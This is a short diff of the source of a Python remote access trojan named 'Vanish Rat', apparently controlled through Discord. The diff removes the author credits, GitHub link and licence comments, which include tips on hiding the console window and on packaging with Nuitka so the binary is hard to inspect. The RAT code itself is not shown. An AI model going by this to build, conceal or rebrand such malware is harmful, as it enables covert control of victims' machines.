@@ -1,14 +1,4 @@
-# Vanish Rat 1.0 was coded by @DEADCONVICESS 
-# This Rat Is Simple And Good For Learning Python.
-# This File Opens a Black Consloe Window For Debugging but U Can Remove Via Nuitka, Pyarmor, Pyinstaller, .pyw
-# Pyinstaller Is Super Easy To Crack So Use Nuitka
-# Github - https://github.com/deadconvicess/Vanish-Rat
-#=============================================================
-# DO NOT TOUCH OR CHANGE SOURCECODE/RESELL SRC.
-# THIS CODE IS COPYRIGHT TO @DEADCONVICESS UNDER M.I.T LICENSE
-#==============================================================
 
-# Source Code
 import discord
 from discord.ext import commands
 import asyncio
@@ -2109,12 +2099,3 @@ if __name__ == "__main__":
     while True:
         time.sleep(1)
      
-# Vanish Rat 1.0 was coded by @DEADCONVICESS 
-# This Rat Is Simple And Good For Learning Python.
-# This File Opens a Black Consloe Window For Debugging but U Can Remove Via Nuitka, Pyarmor, Pyinstaller, .pyw
-# Pyinstaller Is Super Easy To Crack So Use Nuitka
-# Github - https://github.com/deadconvicess/Vanish-Rat
-#=============================================================
-# DO NOT TOUCH OR CHANGE SOURCECODE/RESELL SRC.
-# THIS CODE IS COPYRIGHT TO @DEADCONVICESS UNDER M.I.T LICENSE
-#==============================================================
